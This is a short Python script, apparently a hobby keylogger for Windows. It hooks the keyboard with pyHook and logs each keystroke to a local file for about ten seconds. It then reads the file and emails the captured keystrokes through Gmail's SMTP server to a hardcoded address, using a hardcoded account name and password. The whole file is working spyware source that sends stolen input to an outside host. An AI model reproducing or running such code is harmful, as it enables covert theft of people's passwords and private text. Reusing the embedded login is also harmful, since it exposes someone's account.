#modules used PyHook pywin32
import pyHook, pythoncom, sys, logging
import time,os,sys,smtplib


#create file log in current directory
file_log=os.getcwd()+'\\log.txt'

def OnKeyBoardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
                     
hooks_manager= pyHook.HookManager()
hooks_manager.KeyDown = OnKeyBoardEvent
hooks_manager.HookKeyboard()
#pythoncom.PumpMessages()
while time.clock() < 10:
    pythoncom.PumpWaitingMessages()
                        




file=open('log.txt','r')
content=file.read()



#server and port
mail=smtplib.SMTP('smtp.gmail.com',587)

#identify to the server ESMTP
mail.ehlo()

#start TLS mode = encrypt smtp for login

mail.starttls()
mail.login('distrobyte','distroByte268')

#SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options])
mail.sendmail('dejanualex@yahoo.com','dejanualex@yahoo.com',content)

mail.close()
file.close()




